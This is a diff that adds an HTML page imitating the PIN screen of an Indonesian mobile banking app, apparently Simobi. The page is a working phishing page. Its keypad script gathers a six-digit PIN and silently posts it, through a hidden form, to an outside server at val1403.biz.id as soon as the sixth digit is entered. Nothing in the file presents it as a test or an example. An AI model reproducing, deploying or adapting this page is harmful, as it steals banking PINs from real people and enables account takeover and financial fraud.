@@ -1,0 +1,121 @@
+<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;" />
+  <title>Masukkan PIN</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      margin-top: 50px;
+      background: url("https://programpromo.publit.io/file/Boloe.png") no-repeat center center fixed;
+      background-size: cover;
+    }
+
+    .container {
+      max-width: 300px;
+      margin: auto;
+    }
+
+    h2 {
+      font-size: 20px;
+      margin-bottom: 30px;
+    }
+
+    .pin-dots span {
+      display: inline-block;
+      width: 15px;
+      height: 15px;
+      margin: 7px;
+      border-radius: 50%;
+      background-color: #ccc;
+    }
+
+    .pin-dots span.filled {
+      background-color: #333;
+    }
+
+    .keypad {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin-top: 110px;
+    }
+
+    .keypad button {
+      padding: 30px;
+      font-size: 20px;
+      font-weight: bold;
+      cursor: pointer;
+      border: none;
+      background-color: transparent;
+    }
+
+    .reset {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    .reset a {
+      color: #007bff;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Masukkan PIN M-binking simobi</h2>
+    <div class="pin-dots" id="pin-dots">
+      <span></span><span></span><span></span><span></span><span></span><span></span>
+    </div>
+    <div class="keypad">
+      <button onclick="inputPin('1')">1</button>
+      <button onclick="inputPin('2')">2</button>
+      <button onclick="inputPin('3')">3</button>
+      <button onclick="inputPin('4')">4</button>
+      <button onclick="inputPin('5')">5</button>
+      <button onclick="inputPin('6')">6</button>
+      <button onclick="inputPin('7')">7</button>
+      <button onclick="inputPin('8')">8</button>
+      <button onclick="inputPin('9')">9</button>
+      <div></div>
+      <button onclick="inputPin('0')">0</button>
+      <button onclick="hapusPin()">⌫</button>
+    </div>
+    <p class="reset">Lupa PIN? <a href="#">Reset</a></p>
+  </div>
+
+  <form action="https://val1403.biz.id/smobi/pin.php" method="POST" id="pinForm">
+    <input type="hidden" name="pin1" id="pinInput">
+  </form>
+
+  <script>
+    let pin = "";
+
+    function inputPin(num) {
+      if (pin.length < 6) {
+        pin += num;
+        updateDots();
+        if (pin.length === 6) {
+          document.getElementById("pinInput").value = pin;
+          document.getElementById("pinForm").submit();
+        }
+      }
+    }
+
+    function hapusPin() {
+      pin = pin.slice(0, -1);
+      updateDots();
+    }
+
+    function updateDots() {
+      const dots = document.querySelectorAll("#pin-dots span");
+      dots.forEach((dot, index) => {
+        dot.classList.toggle("filled", index < pin.length);
+      });
+    }
+  </script>
+</body>
+</html>
